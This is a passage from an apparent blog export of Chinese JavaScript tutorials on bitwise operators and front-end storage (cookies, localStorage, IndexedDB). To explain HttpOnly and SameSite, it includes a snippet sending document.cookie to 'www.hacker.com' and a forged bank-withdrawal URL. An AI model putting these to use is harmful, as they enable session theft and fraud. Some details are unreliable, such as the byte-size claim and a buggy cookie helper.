class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">null == undefined； // true</span><br><span class=\"line\">null == 0;          // false</span><br><span class=\"line\">undefined == 0;     // false</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>NaN与任何值比较相等，都是false，比较不等都是true：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NaN == null // false</span><br><span class=\"line\">NaN != null // true</span><br><span class=\"line\">NaN != NaN  // true</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>如果两个都是对象，如果这两个指向同一个对象，返回true，否则false</p>\n</li>\n</ul>\n<h2 id=\"3-7-位操作\"><a href=\"#3-7-位操作\" class=\"headerlink\" title=\"3.7 位操作\"></a>3.7 位操作</h2><h3 id=\"3-7-1-位操作基础知识\"><a href=\"#3-7-1-位操作基础知识\" class=\"headerlink\" title=\"3.7.1 位操作基础知识\"></a>3.7.1 位操作基础知识</h3><ol>\n<li>JS的数字都使用64位格式存储，所以一个数字是4Byte，此外一个英文字母是1Byte，一个汉字是2Byte，基本数据类型变量8Byte</li>\n<li>机器层面是64位，使用JS实际操作时，按照32位操作，有符号整数，左起第一位是符号位，其余为数值位，无符号整数，32位都是数值位，因此数值更大</li>\n<li>负数存储使用二进制补码，求二进制补码的过程：</li>\n</ol>\n<ul>\n<li>求这个数绝对值的二进制码</li>\n<li>求二进制码的反码(0变1,1变0)</li>\n<li>将反码加一</li>\n</ul>\n<ol start=\"4\">\n<li>负数的二进制补码形式只在机器存储层面表现，使用toString()输出二进制字符串时，对于负数，得到的只是绝对值二进制码前面加符号</li>\n<li>机器层面把64位存储转换成32位，JS操作完再把32位转成64位存储，这个过程导致副作用是：对NaN和Infinity应用位操作时，都被当成0处理</li>\n<li><strong>位操作都只对整数有效，如果是小数，先舍弃小数，再进行位操作运算</strong></li>\n</ol>\n<h3 id=\"3-7-2-位操作运算\"><a href=\"#3-7-2-位操作运算\" class=\"headerlink\" title=\"3.7.2 位操作运算\"></a>3.7.2 位操作运算</h3><h4 id=\"1位操作符列表\"><a href=\"#1位操作符列表\" class=\"headerlink\" title=\"1位操作符列表\"></a>1位操作符列表</h4><table>\n<thead>\n<tr>\n<th>操作符</th>\n<th>英文名</th>\n<th>中文名</th>\n<th>用法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>~</td>\n<td>NOT</td>\n<td>按位非</td>\n<td><code>~i = -(i+1)</code>，求反码值</td>\n</tr>\n<tr>\n<td>&amp;</td>\n<td>AND</td>\n<td>按位与</td>\n<td><code>var res = 3 &amp; 7</code></td>\n</tr>\n<tr>\n<td>^</td>\n<td>XOR</td>\n<td>按位异或</td>\n<td><code>var res = 25 ^ 3</code></td>\n</tr>\n<tr>\n<td>&lt;&lt;</td>\n<td>LEFT SHIFT</td>\n<td>左移</td>\n<td><code>var res = 2 &lt;&lt; 5</code></td>\n</tr>\n<tr>\n<td>&gt;&gt;</td>\n<td>RIGHT SHIFT</td>\n<td>有符号右移</td>\n<td><code>var res = 64 &gt;&gt; 5</code></td>\n</tr>\n<tr>\n<td>&gt;&gt;&gt;</td>\n<td>ZERO-FILL RIGHT SHIFT</td>\n<td>无符号右移</td>\n<td><code>var res = 64 &gt;&gt;&gt; 5</code></td>\n</tr>\n</tbody>\n</table>\n<p>按位或的符号与MD表格冲突，列在表格外：<br><code>|</code>   OR    按位或    <code>var res = 3 | 7</code>  </p>\n<h4 id=\"2位操作符应用场景-2-3-4：\"><a href=\"#2位操作符应用场景-2-3-4：\" class=\"headerlink\" title=\"2位操作符应用场景^2^3^4：\"></a>2位操作符应用场景^2^3^4：</h4><p>列举常用的比较简单的使用场景，尽量少用，会使阅读者理解困难，主要是当别人装13时，自己不至于蒙圈</p>\n<ol>\n<li><p>~-1 = 0，配合利用arr.indexOf(xxx) = -1代表arr中不存在xxx</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var arr = [&apos;aa&apos;, &apos;bb&apos;] ;</span><br><span class=\"line\">if(~arr.indexOf(xxx)) &#123;&#125;  // 相当于if(0)，即if(arr中不存在xxx)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>求整，相当于Math.floor：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var num1 = ~~1.1; // 1 </span><br><span class=\"line\">var num2 = ~~1.9; // 1 </span><br><span class=\"line\">var num3 = 1.9|0; // 1</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>&amp; 判断奇偶：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function isOdd(n)&#123;</span><br><span class=\"line\">    return n &amp; 1?true:false;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">isOdd(3); // true</span><br><span class=\"line\">isOdd(4); // false</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>&lt;&lt;和&gt;&gt;2的幂运算</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function power(n)&#123;</span><br><span class=\"line\">    return 1 &lt;&lt; n; // 求2的n次方</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">power(5); //32</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(32&gt;&gt;1); //求32的一半</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>&gt;&gt;&gt;</code>判断数的正负</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function isPos(n)&#123;</span><br><span class=\"line\">   return n === (n&gt;&gt;&gt;0) ? true:false;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">isPos(-1); // false</span><br><span class=\"line\">isPos(1); // true</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>-1&gt;&gt;&gt;0虽然没有向右移动位数，但-1的二进制码已经变成了正数的二进制码：<br>所以-1&gt;&gt;&gt;0的值为4294967295。</p>\n<ol start=\"6\">\n<li>或者随机颜色色值，其实用到位运算的就是一个取整，使用Math.floor是一样的<br><code>&#39;#&#39;+(Math.random()*0xFFFFFF|0).toString(16)</code></li>\n</ol>\n<hr>\n<blockquote>\n<p>本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 <a href=\"mailto:miao.hnlk@gmail.com\" target=\"_blank\" rel=\"noopener\">miao.hnlk@gmail.com</a><br>本文地址：<a href=\"http://luckymona.github.io/2016/09/17/read-book-professional-javascript3\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com/2016/09/17/read-book-professional-javascript3</a></p>\n</blockquote>\n<p>Reference：</p>\n<p>^2:<a href=\"http://www.tuicool.com/articles/VJryYb\" target=\"_blank\" rel=\"noopener\">js中位运算的运用</a><br>^3:<a href=\"http://www.kqiqi.com/knowledge/program/1079.html\" target=\"_blank\" rel=\"noopener\">JS中位操作符有什么特殊作用</a><br>^4:<a href=\"http://www.mmfei.com/?p=299\" target=\"_blank\" rel=\"noopener\">小代码大学问之JavaScript位运算</a></p>"},{"title":"前端常用存储技术总结","date":"2016-11-11T11:10:00.000Z","toc":true,"comments":1,"_content":"主要总结了前端常用的客户端存储技术，主要包括Cookie、HTML5 Web Storage，和客户端数据库的内容。\n\n<!-- more -->\n\n> by MaryTien from  http://supermaryy.com\n\n# 一、cookie#\n\ncookie是浏览器保存在用户计算机上的少量数据，每次发送HTTP请求时自动地在附在HTTP头部里。\n\n## 容量限制##\n\n1. 存储容量较小，每个域名4K左右\n2. 并有存储条数的限制，不同浏览器上限不同，一般在每个域名20~50条\n3. 超出限制不会做任何提醒，后写入的cookie 会盖掉前面的cookie\n\n## 存储时长##\n\n1. 如果设定了超时时间，cookie将在到期时失效。\n2. **如果没设定，将在关闭浏览器时失效。**在未关闭浏览器的情况下，所有的tab级别的页面新开或刷新，cookie都可用。**（区别于sessionStorage的Tab级session）**\n\n## 典型使用场景##\n\n1. Session管理：登录、购物车、游戏得分等用户状态\n\n2. 保存用户个性化设置，使用偏好、主题等\n\n3. 用户跟踪，记录和分析用户行为\n\n## 使用注意##\n\n1. 因为浏览器cookie容量有限，并且会在每一次请求中都附带cookie，所以应尽量避免使用cookie，仅是为了客户端存储的话，可以用Web Storage替代。只有需要每次请求都需要附带的信息，才需要使用cookie，例如身份验证信息。\n2. cookie的名/值对中的值不允许出现分号、逗号和空白符，因此在设置cookie时要先用encodeURIComponent()编码，读取时解码。\n\n## 基本API##\n\n**后端设置cookie：** `Set-Cookie: <cookie-name>=<cookie-value>`\n\n后端接收到前端的请求时，返回一个包含`Set-Cookie`的响应头，浏览器接收响应后就会存储该cookie，并在之后的每一次请求中自动附带这个cookie，直到过了超时期限\n\n**前端设置cookie：**` document.cookie = \"name=value[;expires=date][;path=path-to-resource][;domain=域名][;secure]\"`\n\n因为`document.cookie`是一个字符串，所以如果系统中需要频繁操作cookie，一般会把相关方法封装一下，也有一些现成的工具，如`jquery.cookie.js`、`js.cookie`等，下面是我的简单封装（未经调试，只是写下思路）：\n\n```javascript\nvar cookieObj = {\n\tget:function(keyName){\n\t\tif(!keyName){\n  \t\t\talert('superMary says：cookieObj.get need a param！');\n  \t\t\treturn;\n\t\t}\n\t\tvar encodedKeyName = encodeURIComponent(keyName);\n\t\tvar docCookieArr = document.cookie.split(';');\n\t\tvar resultCookie = docCookieArr.filter(function(item,index){\n\t\t\tvar cookieArr = item.split('=');\n  \t\t\treturn cookieArr[0] === encodedKeyName;\n\t\t})\n\t\tif(resultCookie.length>0){\n  \t\t\treturn resultCookie[0].split('=')[1];\n\t\t}\n\t\talert('superMary says：not find the cookie of'+ keyName);\t\t\n\t},\n\t\n\tset:function(oCookie){\n  \t\tvar cookieStr = encodeURIComponent(oCookie.keyName) + '=' + encodeURIComponent(oCookie.keyValue);\n  \t\tif(oCookie.expires){\n  \t\t\tcookieStr += ';expires=' + oCookie.expires;\n\t\t}\n      \tif(oCookie.path){\n  \t\t\tcookieStr += ';path=' + oCookie.path;\n\t\t}\n      \tif(oCookie.Domain){\n  \t\t\tcookieStr += ';path=' + oCookie.path;\n\t\t}\n      \t// secure和httpOnly...\n\t},\n  \tdelCookie:function(keyName){\n  \t\tvar date = new Date();\n      \tdate.setHours(-1);\n      \tthis.set({\n          keyName:keyName,\n          expires:date\n\t\t})\n\t}\n}\n```\n\n## cookie属性##\n\n以CSDN网站的cookie为例：\n\n![图0_CSDN网站的cookie](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_0.png)\n\n主要介绍以下参数：Domain / Path / Expires / Max-Age / HTTPOnly /  Secure /  SameSite\n\n\n### 时间类属性 Expires / Max-Age###\n\n`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;`\n\nExpires：指定一个GMT格式的绝对时间\n\nMax-Age：指定一个以秒为单位的相对时间，相对的是文档第一次被请求时服务器记录的请求时间\n\n\n### 域类属性 Domain / Path###\n\n`Set-Cookie: id=a3fWa;Domain=.baidu.com;Path = /;`\n\n1. 表示cookie所在的域，默认为html文件所在的域名，path为html文件所在的路径。\n\n   例：为http://www.baidu.com/test/testCookie.html 页面中的js设置cookie，默认情况下cookie的的Domain为：.baidu.com，Path为：/test\n\n2. cookie只能被该Domain域名或其子域名下的页面访问\n\n3. cookie只能被该Path路径或其子路径下的页面访问\n\n   1. 二级域名间可以通过设置Domain共享Cookie，实现跨域。\n\n      ​例如：a.baidu.com      b.baidu.com`Set-Cookie: id=a3fWa;Domain=.baidu.com;Path = /;`\n\n\n\n### 安全类属性 Secure / HttpOnly###\n\n`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly;`\n\n **Secure**指示浏览器仅通过 HTTPS 连接传回 cookie，仅用于HTTPS网站。\n\n注意：Chrome 52 、Firefox 52之前的版本，即使设置了Secure，仍然可以通过HTTP进行传输，所以即使设置了Secure，敏感信息依然不能存在cookie里。\n\n**HttpOnly**设置了HttpOnly的Cookie只能发送给服务器，不能通过JavaScript访问，有助于防止cookie劫持类XSS攻cookie劫持类XSS攻击\n\n**cookie劫持类XSS攻击**\n\n![图1_Xss攻击图解](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_1.png)\n\nvar cookie = document.cookie;\n\nsrc=‘www.hacker.com?cookie=’ + cookie \n\n\n### 安全类属性 SameSite###\n\n1. 表明这个 cookie 是个“同站 cookie”，同站 cookie 只能作为第一方 cookie，不能作为第三方 cookie。\n2. 可以用来防范CSRF（Cross-Site Request Forgery跨站请求伪造）攻击\n\n**第三方cookie** \n\n简单来说，第三方cookie就是HTTP请求的Referer值和请求的网址域名不同\n\n![图2_第三方cookie](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_2.png)\n\n\n\n**CSRF攻击过程**\n\n![图3_CSRF攻击](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_3.png)\n\nsrc=‘www.bankA.com/withdraw?money=1000&to=hackerAccount’ \n\nIE和Safari尚不支持，并且计划版本中也没有加入这个功能\n\n![图4_sameSite的浏览器支持情况](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_4.png)\n\n\n# 二、localStorage / sessionStorage#\n\n它相当于一个简易的客户端数据库，允许用户以key/value的形式存储数据。\n\n### 区别###\n\nlocalStorage：会一直保存在浏览器中，除非用户手动清除\nsessionStorage：存储于浏览器端，**是Tab级别的Session** ，在新开的Tab页下，或者关闭本Tab再打开后，都是无法访问到之前保存的sessionStorage的。但如果只是刷新Tab页，则可以访问之前存储的Session\n以下内容均以localStorage作例子\n\n### 存储限制###\n\nHTML5规范建议存储上限为5MB，各家浏览器在具体实现时的存储上限为每个域名5M~10MB\n\n### 浏览器支持###\n\nIE8+/11、Firefox 3.5+/57、Chrome 4+/62、Safari 4+/11、Opera 11.5+/48\n\n### 用途：###\n\nWeb Storage可以用来存储用户的操作状态、用户信息、会话信息等。并且可以用来创建离线使用的APP，用户离线时存储的数据可以在再次联网时发送给服务器做一次批量更新。\n\n### 常用API###\n\nlocalStorage.setItem(keyName, keyValue);\nlocalStorage.getItem(KeyName);\nlocalStorage.removeItem(keyName) ;\nlocalStorage.clear () ;\nlocalStorage.length ;\n\n### Storage Event###\n\n当向storage中存储数据或移除数据时，会在window对象上触发一个`storage event`，可以添加监听器进行监听。\n\n```javascript\nwindow.addEventListener('storage', storageEventHandler, false);\n```\n\n**注意**\n事件只能在别的浏览器窗口监听到（不是事件被触发的这个窗口），并且如果数据没有改变的话，不会触发事件。\n只对localStorage 的改变有效，对sessionStorage无效\n\n**用途：**\n可以用来在不同页面间实时同步数据（相同浏览器的不同窗口间）。\n\n### 超出存储限制：###\n\n**QUOTA_EXCEEDED_ERR** ：写入的数据大小超出浏览器的限制就会抛出这个异常\n最佳实践是，当存储数据时使用try/catch包裹代码块。\n\n\tfunction setSettings() {\n\t  \tif ('localStorage' in window && window['localStorage'] !== null) {\n\t      \ttry {\n\t          \tlocalStorage.setItem('keyName', 'keyValue');\n\t      \t} catch (e) {\n\t              if (e == QUOTA_EXCEEDED_ERR) {\n\t                      alert('Quota exceeded!');\n\t                  }\n\t        }\n\t \t} else {\n\t  \t\talert('Cannot store user preferences as your browser do not support local storage');\n\t  \t}\n\t}\n## 三、客户端数据库##\n\ncookie、sessionStorage、localStorage容量较小，且只能处理key-value结构的简单的数据，而客户端数据库则可以解决这些问题。\n\n**包括** ：Web SQL Database  / IndexedDB\n\n**访问** ：同域名下可以访问。\n\n**存储时间** ：永久存储，除非用户手动清除数据。\n\n**大小限制** ：理论上没有大小限制，但IndexedDB的数据库超过50M的时候浏览器会弹出确认。\n\n### Web SQL Database###\n\n1. 可以处理复杂的关系型数据，并且使用SQL语句进行操作\n2. 因为过于依赖后端SQL语言的语法，**已被Web应用工作组废弃** ，但在手机端浏览器中的的支持率仍然较高\n\n   ![图5_Web SQL Database浏览器支持情况](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_5.png)\n\n**三个核心方法：** \nopenDatabase：创建数据库对象\ntransaction：用于根据情况控制事务提交或回滚\nexecuteSql：用于执行SQL 查询\n\n### IndexedDB###\n\n1. IndexedDB更像是NoSQL，可以直接使用JS的方法操作数据\n2. 大部分浏览器都已支持或支持部分功能\n\n![图6_indexedDB浏览器支持情况](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_6.png)","source":"_posts/storage-in-frontent.md","raw":"---\ntitle: 前端常用存储技术总结\ndate: 2016-11-11 19:10:00\ncategories: Javascript #CSS，HTTP，Javascript，NodeJS，框架\ntags: [Javascript] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\n主要总结了前端常用的客户端存储技术，主要包括Cookie、HTML5 Web Storage，和客户端数据库的内容。\n\n<!-- more -->\n\n> by MaryTien from  http://supermaryy.com\n\n# 一、cookie#\n\ncookie是浏览器保存在用户计算机上的少量数据，每次发送HTTP请求时自动地在附在HTTP头部里。\n\n## 容量限制##\n\n1. 存储容量较小，每个域名4K左右\n2. 并有存储条数的限制，不同浏览器上限不同，一般在每个域名20~50条\n3. 超出限制不会做任何提醒，后写入的cookie 会盖掉前面的cookie\n\n## 存储时长##\n\n1. 如果设定了超时时间，cookie将在到期时失效。\n2. **如果没设定，将在关闭浏览器时失效。**在未关闭浏览器的情况下，所有的tab级别的页面新开或刷新，cookie都可用。**（区别于sessionStorage的Tab级session）**\n\n## 典型使用场景##\n\n1. Session管理：登录、购物车、游戏得分等用户状态\n\n2. 保存用户个性化设置，使用偏好、主题等\n\n3. 用户跟踪，记录和分析用户行为\n\n## 使用注意##\n\n1. 因为浏览器cookie容量有限，并且会在每一次请求中都附带cookie，所以应尽量避免使用cookie，仅是为了客户端存储的话，可以用Web Storage替代。只有需要每次请求都需要附带的信息，才需要使用cookie，例如身份验证信息。\n2. cookie的名/值对中的值不允许出现分号、逗号和空白符，因此在设置cookie时要先用encodeURIComponent()编码，读取时解码。\n\n## 基本API##\n\n**后端设置cookie：** `Set-Cookie: <cookie-name>=<cookie-value>`\n\n后端接收到前端的请求时，返回一个包含`Set-Cookie`的响应头，浏览器接收响应后就会存储该cookie，并在之后的每一次请求中自动附带这个cookie，直到过了超时期限\n\n**前端设置cookie：**` document.cookie = \"name=value[;expires=date][;path=path-to-resource][;domain=域名][;secure]\"`\n\n因为`document.cookie`是一个字符串，所以如果系统中需要频繁操作cookie，一般会把相关方法封装一下，也有一些现成的工具，如`jquery.cookie.js`、`js.cookie`等，下面是我的简单封装（未经调试，只是写下思路）：\n\n```javascript\nvar cookieObj = {\n\tget:function(keyName){\n\t\tif(!keyName){\n  \t\t\talert('superMary says：cookieObj.get need a param！');\n  \t\t\treturn;\n\t\t}\n\t\tvar encodedKeyName = encodeURIComponent(keyName);\n\t\tvar docCookieArr = document.cookie.split(';');\n\t\tvar resultCookie = docCookieArr.filter(function(item,index){\n\t\t\tvar cookieArr = item.split('=');\n  \t\t\treturn cookieArr[0] === encodedKeyName;\n\t\t})\n\t\tif(resultCookie.length>0){\n  \t\t\treturn resultCookie[0].split('=')[1];\n\t\t}\n\t\talert('superMary says：not find the cookie of'+ keyName);\t\t\n\t},\n\t\n\tset:function(oCookie){\n  \t\tvar cookieStr = encodeURIComponent(oCookie.keyName) + '=' + encodeURIComponent(oCookie.keyValue);\n  \t\tif(oCookie.expires){\n  \t\t\tcookieStr += ';expires=' + oCookie.expires;\n\t\t}\n      \tif(oCookie.path){\n  \t\t\tcookieStr += ';path=' + oCookie.path;\n\t\t}\n      \tif(oCookie.Domain){\n  \t\t\tcookieStr += ';path=' + oCookie.path;\n\t\t}\n      \t// secure和httpOnly...\n\t},\n  \tdelCookie:function(keyName){\n  \t\tvar date = new Date();\n      \tdate.setHours(-1);\n      \tthis.set({\n          keyName:keyName,\n          expires:date\n\t\t})\n\t}\n}\n```\n\n## cookie属性##\n\n以CSDN网站的cookie为例：\n\n![图0_CSDN网站的cookie](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_0.png)\n\n主要介绍以下参数：Domain / Path / Expires / Max-Age / HTTPOnly /  Secure /  SameSite\n\n\n### 时间类属性 Expires / Max-Age###\n\n`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;`\n\nExpires：指定一个GMT格式的绝对时间\n\nMax-Age：指定一个以秒为单位的相对时间，相对的是文档第一次被请求时服务器记录的请求时间\n\n\n### 域类属性 Domain / Path###\n\n`Set-Cookie: id=a3fWa;Domain=.baidu.com;Path = /;`\n\n1. 表示cookie所在的域，默认为html文件所在的域名，path为html文件所在的路径。\n\n   例：为http://www.baidu.com/test/testCookie.html 页面中的js设置cookie，默认情况下cookie的的Domain为：.baidu.com，Path为：/test\n\n2. cookie只能被该Domain域名或其子域名下的页面访问\n\n3. cookie只能被该Path路径或其子路径下的页面访问\n\n   1. 二级域名间可以通过设置Domain共享Cookie，实现跨域。\n\n      ​例如：a.baidu.com      b.baidu.com`Set-Cookie: id=a3fWa;Domain=.baidu.com;Path = /;`\n\n\n\n### 安全类属性 Secure / HttpOnly###\n\n`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly;`\n\n **Secure**指示浏览器仅通过 HTTPS 连接传回 cookie，仅用于HTTPS网站。\n\n注意：Chrome 52 、Firefox 52之前的版本，即使设置了Secure，仍然可以通过HTTP进行传输，所以即使设置了Secure，敏感信息依然不能存在cookie里。\n\n**HttpOnly**设置了HttpOnly的Cookie只能发送给服务器，不能通过JavaScript访问，有助于防止cookie劫持类XSS攻cookie劫持类XSS攻击\n\n**cookie劫持类XSS攻击**\n\n![图1_Xss攻击图解](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_1.png)\n\nvar cookie = document.cookie;\n\nsrc=‘www.hacker.com?cookie=’ + cookie \n\n\n### 安全类属性 SameSite###\n\n1. 表明这个 cookie 是个“同站 cookie”，同站 cookie 只能作为第一方 cookie，不能作为第三方 cookie。\n2. 可以用来防范CSRF（Cross-Site Request Forgery跨站请求伪造）攻击\n\n**第三方cookie** \n\n简单来说，第三方cookie就是HTTP请求的Referer值和请求的网址域名不同\n\n![图2_第三方cookie](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_2.png)\n\n\n\n**CSRF攻击过程**\n\n![图3_CSRF攻击](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_3.png)\n\nsrc=‘www.bankA.com/withdraw?money=1000&to=hackerAccount’ \n\nIE和Safari尚不支持，并且计划版本中也没有加入这个功能\n\n![图4_sameSite的浏览器支持情况](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_4.png)\n\n\n# 二、localStorage / sessionStorage#\n\n它相当于一个简易的客户端数据库，允许用户以key/value的形式存储数据。\n\n### 区别###\n\nlocalStorage：会一直保存在浏览器中，除非用户手动清除\nsessionStorage：存储于浏览器端，**是Tab级别的Session** ，在新开的Tab页下，或者关闭本Tab再打开后，都是无法访问到之前保存的sessionStorage的。但如果只是刷新Tab页，则可以访问之前存储的Session\n以下内容均以localStorage作例子\n\n### 存储限制###\n\nHTML5规范建议存储上限为5MB，各家浏览器在具体实现时的存储上限为每个域名5M~10MB\n\n### 浏览器支持###\n\nIE8+/11、Firefox 3.5+/57、Chrome 4+/62、Safari 4+/11、Opera 11.5+/48\n\n### 用途：###\n\nWeb Storage可以用来存储用户的操作状态、用户信息、会话信息等。并且可以用来创建离线使用的APP，用户离线时存储的数据可以在再次联网时发送给服务器做一次批量更新。\n\n### 常用API###\n\nlocalStorage.setItem(keyName, keyValue);\nlocalStorage.getItem(KeyName);\nlocalStorage.removeItem(keyName) ;\nlocalStorage.clear () ;\nlocalStorage.length ;\n\n### Storage Event###\n\n当向storage中存储数据或移除数据时，会在window对象上触发一个`storage event`，可以添加监听器进行监听。\n\n```javascript\nwindow.addEventListener('storage', storageEventHandler, false);\n```\n\n**注意**\n事件只能在别的浏览器窗口监听到（不是事件被触发的这个窗口），并且如果数据没有改变的话，不会触发事件。\n只对localStorage 的改变有效，对sessionStorage无效\n\n**用途：**\n可以用来在不同页面间实时同步数据（相同浏览器的不同窗口间）。\n\n### 超出存储限制：###\n\n**QUOTA_EXCEEDED_ERR** ：写入的数据大小超出浏览器的限制就会抛出这个异常\n最佳实践是，当存储数据时使用try/catch包裹代码块。\n\n\tfunction setSettings() {\n\t  \tif ('localStorage' in window && window['localStorage'] !== null) {\n\t      \ttry {\n\t          \tlocalStorage.setItem('keyName', 'keyValue');\n\t      \t} catch (e) {\n\t              if (e == QUOTA_EXCEEDED_ERR) {\n\t                      alert('Quota exceeded!');\n\t                  }\n\t        }\n\t \t} else {\n\t  \t\talert('Cannot store user preferences as your browser do not support local storage');\n\t  \t}\n\t}\n## 三、客户端数据库##\n\ncookie、sessionStorage、localStorage容量较小，且只能处理key-value结构的简单的数据，而客户端数据库则可以解决这些问题。\n\n**包括** ：Web SQL Database  / IndexedDB\n\n**访问** ：同域名下可以访问。\n\n**存储时间** ：永久存储，除非用户手动清除数据。\n\n**大小限制** ：理论上没有大小限制，但IndexedDB的数据库超过50M的时候浏览器会弹出确认。\n\n### Web SQL Database###\n\n1. 可以处理复杂的关系型数据，并且使用SQL语句进行操作\n2. 因为过于依赖后端SQL语言的语法，**已被Web应用工作组废弃** ，但在手机端浏览器中的的支持率仍然较高\n\n   ![图5_Web SQL Database浏览器支持情况](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_5.png)\n\n**三个核心方法：** \nopenDatabase：创建数据库对象\ntransaction：用于根据情况控制事务提交或回滚\nexecuteSql：用于执行SQL 查询\n\n### IndexedDB###\n\n1. IndexedDB更像是NoSQL，可以直接使用JS的方法操作数据\n2. 大部分浏览器都已支持或支持部分功能\n\n![图6_indexedDB浏览器支持情况](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_6.png)","slug":"storage-in-frontent","published":1,"updated":"2018-08-04T04:13:09.576Z","_id":"cjgw444a8002c8d95nfkjj4v0","layout":"post","photos":[],"link":"","content":"<p>主要总结了前端常用的客户端存储技术，主要包括Cookie、HTML5 Web Storage，和客户端数据库的内容。</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>by MaryTien from  <a href=\"http://supermaryy.com\">http://supermaryy.com</a></p>\n</blockquote>\n<h1 id=\"一、cookie\"><a href=\"#一、cookie\" class=\"headerlink\" title=\"一、cookie\"></a>一、cookie</h1><p>cookie是浏览器保存在用户计算机上的少量数据，每次发送HTTP请求时自动地在附在HTTP头部里。</p>\n<h2 id=\"容量限制\"><a href=\"#容量限制\" class=\"headerlink\" title=\"容量限制\"></a>容量限制</h2><ol>\n<li>存储容量较小，每个域名4K左右</li>\n<li>并有存储条数的限制，不同浏览器上限不同，一般在每个域名20~50条</li>\n<li>超出限制不会做任何提醒，后写入的cookie 会盖掉前面的cookie</li>\n</ol>\n<h2 id=\"存储时长\"><a href=\"#存储时长\" class=\"headerlink\" title=\"存储时长\"></a>存储时长</h2><ol>\n<li>如果设定了超时时间，cookie将在到期时失效。</li>\n<li><strong>如果没设定，将在关闭浏览器时失效。</strong>在未关闭浏览器的情况下，所有的tab级别的页面新开或刷新，cookie都可用。<strong>（区别于sessionStorage的Tab级session）</strong></li>\n</ol>\n<h2 id=\"典型使用场景\"><a href=\"#典型使用场景\" class=\"headerlink\" title=\"典型使用场景\"></a>典型使用场景</h2><ol>\n<li><p>Session管理：登录、购物车、游戏得分等用户状态</p>\n</li>\n<li><p>保存用户个性化设置，使用偏好、主题等</p>\n</li>\n<li><p>用户跟踪，记录和分析用户行为</p>\n</li>\n</ol>\n<h2 id=\"使用注意\"><a href=\"#使用注意\" class=\"headerlink\" title=\"使用注意\"></a>使用注意</h2><ol>\n<li>因为浏览器cookie容量有限，并且会在每一次请求中都附带cookie，所以应尽量避免使用cookie，仅是为了客户端存储的话，可以用Web Storage替代。只有需要每次请求都需要附带的信息，才需要使用cookie，例如身份验证信息。</li>\n<li>cookie的名/值对中的值不允许出现分号、逗号和空白符，因此在设置cookie时要先用encodeURIComponent()编码，读取时解码。</li>\n</ol>\n<h2 id=\"基本API\"><a href=\"#基本API\" class=\"headerlink\" title=\"基本API\"></a>基本API</h2><p><strong>后端设置cookie：</strong> <code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;</code></p>\n<p>后端接收到前端的请求时，返回一个包含<code>Set-Cookie</code>的响应头，浏览器接收响应后就会存储该cookie，并在之后的每一次请求中自动附带这个cookie，直到过了超时期限</p>\n<p><strong>前端设置cookie：</strong><code>document.cookie = 